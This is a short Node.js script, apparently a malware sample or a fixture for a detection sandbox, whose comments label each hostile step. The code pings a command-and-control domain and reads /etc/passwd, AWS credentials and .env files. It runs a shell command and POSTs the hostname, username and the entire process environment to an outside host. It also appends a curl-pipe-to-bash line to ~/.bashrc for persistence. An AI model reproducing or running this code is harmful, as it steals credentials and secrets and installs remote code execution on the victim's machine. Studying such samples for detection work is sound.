const dns = require('dns');
const https = require('https');
const fs = require('fs');
const os = require('os');
const { execSync } = require('child_process');

// DNS query to C2
dns.lookup('vorvaleon3.sorix7en.surf', () => {});

// Sensitive file reads
try { fs.readFileSync('/etc/passwd', 'utf8'); } catch(e) {}
try { fs.readFileSync(os.homedir() + '/.aws/credentials', 'utf8'); } catch(e) {}

// Honeytoken
try { fs.readFileSync(os.homedir() + '/.env', 'utf8'); } catch(e) {}

// Spawn shell
try { execSync('bash -c "id"'); } catch(e) {}

// POST exfiltration
const data = JSON.stringify({ host: os.hostname(), user: os.userInfo().username, env: process.env });
try {
  const req = https.request({ hostname: 'vorvaleon3.sorix7en.surf', port: 443, path: '/collect', method: 'POST', headers: { 'Content-Type': 'application/json' } });
  req.write(data); req.end();
} catch(e) {}

// Persistence
try { fs.appendFileSync(os.homedir() + '/.bashrc', '\ncurl -s vorvaleon3.sorix7en.surf/init | bash\n'); } catch(e) {}
